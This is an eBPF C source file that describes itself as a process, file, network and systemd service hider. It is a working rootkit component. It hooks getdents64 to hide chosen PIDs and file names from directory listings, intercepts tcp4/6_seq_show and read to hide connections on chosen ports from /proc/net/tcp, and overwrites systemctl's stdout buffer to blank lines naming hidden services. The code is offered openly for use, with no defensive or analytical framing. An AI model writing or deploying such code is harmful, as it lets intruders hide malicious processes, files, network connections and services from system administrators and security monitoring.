//go:build ignore
// SPDX-License-Identifier: GPL-2.0
// Process, file, network & systemd service hider
// Optimized for kernel 5.10 verifier complexity limits
//
// Hiding mechanisms:
//   1. Process hiding: getdents64 hook + /proc/pid/mem patching
//   2. File hiding: same getdents64 hook, pattern-based name match
//   3. Network hiding (/proc/net/tcp): kprobe tcp4/6_seq_show + read tracepoint
//      (ringbuf event → userspace /proc/pid/mem patch)
//   4. Systemd service hiding:
//      a. Service file hiding from directory listings (reuses file hiding)
//      b. systemctl output filtering: write(stdout) tracepoint → userspace line scrubbing
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define NAME_MAX 64

// Event types
#define EVT_HIDE_PID  1
#define EVT_HIDE_FILE 2
#define EVT_HIDE_NET  3   // /proc/net/tcp path (ringbuf)
#define EVT_HIDE_SVC  4   // systemctl output scrubbing

// Dirent hide event (PID and file hiding)
struct hide_event {
    u8  evt_type;
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u32 _pad1;
    u64 buf_addr;
    u64 entry_offset;
    u16 entry_reclen;
    u16 prev_reclen;
    u32 _pad2;
    u64 prev_offset;
    s64 total_size;
    char d_name[NAME_MAX];
};

// Network hide event (for logging)
struct net_hide_event {
    u8  evt_type;
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u16 local_port;
    u16 remote_port;
    u64 buf_addr;
    s64 buf_len;
};

// Service output hide event
// Fired when systemctl writes to stdout; userspace scrubs matching lines
struct svc_hide_event {
    u8  evt_type;
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u32 _pad1;
    u64 buf_addr;
    s64 buf_len;
};

struct getdents_args { u64 dirp; };
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct getdents_args); } args_map SEC(".maps");

// --- PID hiding ---
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_val_map SEC(".maps");
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_mask_map SEC(".maps");

// --- File hiding ---
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u64); __type(value, u64); } file_name_map SEC(".maps");

// --- Network hiding ---
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u32); __type(value, u32); } hide_ports_map SEC(".maps");

// Per-tid: tcp_seq_show match for /proc/net/tcp
struct net_match { u16 local_port; u16 remote_port; };
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct net_match); } net_match_map SEC(".maps");

// Per-tid: read() buf
struct read_args { u64 buf; };
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct read_args); } read_args_map SEC(".maps");

// --- Systemd service hiding ---
// Per-tid: write() buf addr (for sys_exit_write logging)
struct write_args { u64 buf; };
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct write_args); } write_args_map SEC(".maps");

// Comm filter: only intercept writes from "systemctl" processes
// Key = comm (first 8 bytes), Value = 1
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 16);
         __type(key, u64); __type(value, u32); } svc_comm_map SEC(".maps");

// Feature flags: 0=pid, 1=file, 2=net, 3=svc
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 4);
         __type(key, u32); __type(value, u32); } feature_map SEC(".maps");

struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
         __uint(max_entries, 256 * 1024); } events SEC(".maps");

// ===== getdents64 hooks =====

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_sys_enter_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 dirp = 0;
    bpf_probe_read(&dirp, sizeof(dirp), ctx + 24);
    struct getdents_args a = { .dirp = dirp };
    bpf_map_update_elem(&args_map, &tid, &a, BPF_ANY);
    return 0;
}

static __always_inline void emit_dirent_event(u8 evt_type, u32 pid, u32 tid,
    u64 dirp, long off, u16 d_reclen, u16 prev_reclen,
    long prev_off, long ret, void *name_ptr)
{
    struct hide_event *e = bpf_ringbuf_reserve(&events, sizeof(struct hide_event), 0);
    if (!e) return;
    e->evt_type = evt_type;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->buf_addr = dirp;
    e->entry_offset = (u64)off;
    e->entry_reclen = d_reclen;
    e->prev_reclen = prev_reclen;
    e->prev_offset = (u64)prev_off;
    e->total_size = ret;
    bpf_probe_read_user_str(e->d_name, NAME_MAX, name_ptr);
    bpf_ringbuf_submit(e, 0);
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_sys_exit_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;
    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);

    struct getdents_args *a = bpf_map_lookup_elem(&args_map, &tid);
    if (!a) return 0;
    u64 dirp = a->dirp;
    bpf_map_delete_elem(&args_map, &tid);
    if (ret <= 0) return 0;

    u32 idx0 = 0, idx1 = 1;
    u32 *hide_pid_flag = bpf_map_lookup_elem(&feature_map, &idx0);
    u32 *hide_file_flag = bpf_map_lookup_elem(&feature_map, &idx1);
    u32 do_pid = hide_pid_flag ? *hide_pid_flag : 0;
    u32 do_file = hide_file_flag ? *hide_file_flag : 0;
    if (!do_pid && !do_file) return 0;

    u64 target = 0, mask = 0;
    if (do_pid) {
        u32 zero = 0;
        u64 *pv = bpf_map_lookup_elem(&pid_val_map, &zero);
        u64 *pm = bpf_map_lookup_elem(&pid_mask_map, &zero);
        if (pv) target = *pv;
        if (pm) mask = *pm;
    }

    long off = 0, prev_off = -1;
    u16 prev_reclen = 0;
    for (int i = 0; i < 256; i++) {
        if (off >= ret) break;
        u16 d_reclen = 0;
        if (bpf_probe_read_user(&d_reclen, 2, (void *)(dirp + off + 16)) < 0)
            break;
        if (d_reclen == 0 || d_reclen > 4096)
            break;
        u64 name_val = 0;
        bpf_probe_read_user(&name_val, 8, (void *)(dirp + off + 19));

        if (do_pid && mask && ((name_val & mask) == target)) {
            emit_dirent_event(EVT_HIDE_PID, pid, tid, dirp, off, d_reclen,
                       prev_reclen, prev_off, ret, (void *)(dirp + off + 19));
        } else if (do_file) {
            u64 *fmask = bpf_map_lookup_elem(&file_name_map, &name_val);
            if (fmask) {
                emit_dirent_event(EVT_HIDE_FILE, pid, tid, dirp, off, d_reclen,
                           prev_reclen, prev_off, ret, (void *)(dirp + off + 19));
            }
        }
        prev_off = off;
        prev_reclen = d_reclen;
        off += d_reclen;
    }
    return 0;
}

// ===== /proc/net/tcp path =====

static __always_inline int check_port_match(u32 lport, u32 rport)
{
    u32 *p = bpf_map_lookup_elem(&hide_ports_map, &lport);
    if (p) return 1;
    p = bpf_map_lookup_elem(&hide_ports_map, &rport);
    if (p) return 1;
    return 0;
}

SEC("kprobe/tcp4_seq_show")
int kprobe_tcp4_seq_show(struct pt_regs *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;
    u64 v = PT_REGS_PARM2(ctx);
    if (v == 1) return 0;

    u16 dport_be = 0, lport = 0;
    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12));
    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));
    u16 rp = __builtin_bswap16(dport_be);
    if (!check_port_match((u32)lport, (u32)rp)) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    struct net_match nm = { .local_port = lport, .remote_port = rp };
    bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
    return 0;
}

SEC("kprobe/tcp6_seq_show")
int kprobe_tcp6_seq_show(struct pt_regs *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;
    u64 v = PT_REGS_PARM2(ctx);
    if (v == 1) return 0;

    u16 dport_be = 0, lport = 0;
    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12));
    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));
    u16 rp = __builtin_bswap16(dport_be);
    if (!check_port_match((u32)lport, (u32)rp)) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    struct net_match nm = { .local_port = lport, .remote_port = rp };
    bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_read")
int tracepoint_sys_enter_read(void *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 buf = 0;
    bpf_probe_read(&buf, sizeof(buf), ctx + 24);
    struct read_args ra = { .buf = buf };
    bpf_map_update_elem(&read_args_map, &tid, &ra, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int tracepoint_sys_exit_read(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;
    struct read_args *ra = bpf_map_lookup_elem(&read_args_map, &tid);
    if (!ra) return 0;
    u64 buf = ra->buf;
    bpf_map_delete_elem(&read_args_map, &tid);

    struct net_match *nm = bpf_map_lookup_elem(&net_match_map, &tid);
    if (!nm) return 0;
    struct net_match saved = *nm;
    bpf_map_delete_elem(&net_match_map, &tid);

    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);
    if (ret <= 0) return 0;

    struct net_hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    e->evt_type = EVT_HIDE_NET;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->local_port = saved.local_port;
    e->remote_port = saved.remote_port;
    e->buf_addr = buf;
    e->buf_len = ret;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

// ===== Systemd service output hiding =====
// Strategy: intercept write(fd=1, buf, count) from "systemctl" processes
// BEFORE the write syscall executes. Use bpf_probe_write_user to blank
// out lines containing hidden service names directly in user-space buffer.
// This way the kernel copies already-scrubbed data to the terminal.
//
// We store hidden service name prefixes (first 8 bytes) in svc_name_map.
// The scan reads the buffer in chunks looking for newlines, then checks
// each line for a matching 8-byte prefix.

// Map to store hidden service name prefixes
// Key = u64 (first 8 bytes of service name, e.g. "test-hid"), Value = u32(1)
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 16);
         __type(key, u64); __type(value, u32); } svc_name_map SEC(".maps");

// Tail call prog array for scanning write buffer in 64-byte chunks
struct { __uint(type, BPF_MAP_TYPE_PROG_ARRAY); __uint(max_entries, 2);
         __type(key, u32); __type(value, u32); } svc_progs SEC(".maps");

// Per-CPU state for the iterative scan
struct svc_scan_state {
    u64 buf_addr;
    u64 count;
    u64 scan_off;  // current scan offset
};
struct { __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, struct svc_scan_state); } svc_state SEC(".maps");

// The scanner program: scans 64 bytes at current offset, then tail-calls itself
// Uses same tracepoint type but different name for bpf2go
SEC("tracepoint/syscalls/sys_enter_write")
int svc_scan_chunk(void *ctx)
{
    u32 zero = 0;
    struct svc_scan_state *st = bpf_map_lookup_elem(&svc_state, &zero);
    if (!st) return 0;

    u64 buf_addr = st->buf_addr;
    u64 count = st->count;
    u64 base = st->scan_off;
    u64 spaces = 0x2020202020202020ULL;

    // Scan 128 bytes starting from base
    #pragma unroll
    for (int i = 0; i < 128; i++) {
        u64 off = base + (u64)i;
        if (off + 8 > count) return 0; // done
        u64 val = 0;
        if (bpf_probe_read_user(&val, 8, (void *)(buf_addr + off)) < 0) return 0;
        u32 *p = bpf_map_lookup_elem(&svc_name_map, &val);
        if (!p) continue;
        // Blank 128 bytes around match
        u64 bs = off > 8 ? (off - 8) : 0; bs &= ~7ULL;
        #pragma unroll
        for (int w = 0; w < 16; w++) {
            u64 wp = bs + (u64)w * 8;
            if (wp >= count) break;
            bpf_probe_write_user((void *)(buf_addr + wp), &spaces, 8);
        }
    }

    // Advance offset and tail-call self for next chunk
    st->scan_off = base + 128;
    if (st->scan_off + 8 <= count) {
        u32 prog_key = 0;  // index 0 = svc_scanner itself
        bpf_tail_call(ctx, &svc_progs, prog_key);
    }
    return 0;
}

// Entry point: check comm/fd, set up state, start scan
SEC("tracepoint/syscalls/sys_enter_write")
int tracepoint_sys_enter_write(void *ctx)
{
    u32 idx3 = 3;
    u32 *do_svc = bpf_map_lookup_elem(&feature_map, &idx3);
    if (!do_svc || !*do_svc) return 0;

    u64 fd = 0;
    bpf_probe_read(&fd, sizeof(fd), ctx + 16);
    if (fd != 1) return 0;

    char comm[16] = {};
    bpf_get_current_comm(comm, sizeof(comm));
    u64 comm_key = 0;
    __builtin_memcpy(&comm_key, comm, 8);
    u32 *match = bpf_map_lookup_elem(&svc_comm_map, &comm_key);
    if (!match) return 0;

    u64 buf_addr = 0, count = 0;
    bpf_probe_read(&buf_addr, sizeof(buf_addr), ctx + 24);
    bpf_probe_read(&count, sizeof(count), ctx + 32);
    if (count == 0 || buf_addr == 0) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    struct write_args wa = { .buf = buf_addr };
    bpf_map_update_elem(&write_args_map, &tid, &wa, BPF_ANY);

    // Set up per-CPU scan state
    u32 zero = 0;
    struct svc_scan_state *st = bpf_map_lookup_elem(&svc_state, &zero);
    if (!st) return 0;
    st->buf_addr = buf_addr;
    st->count = count < 4096 ? count : 4096;  // cap at 4KB
    st->scan_off = 0;

    // Tail-call into scanner
    bpf_tail_call(ctx, &svc_progs, 0);
    return 0;
}

// sys_exit_write: emit ringbuf event for logging only
SEC("tracepoint/syscalls/sys_exit_write")
int tracepoint_sys_exit_write(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;

    struct write_args *wa = bpf_map_lookup_elem(&write_args_map, &tid);
    if (!wa) return 0;
    bpf_map_delete_elem(&write_args_map, &tid);

    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);
    if (ret <= 0) return 0;

    struct svc_hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    e->evt_type = EVT_HIDE_SVC;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->buf_addr = 0; // not needed for logging
    e->buf_len = ret;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
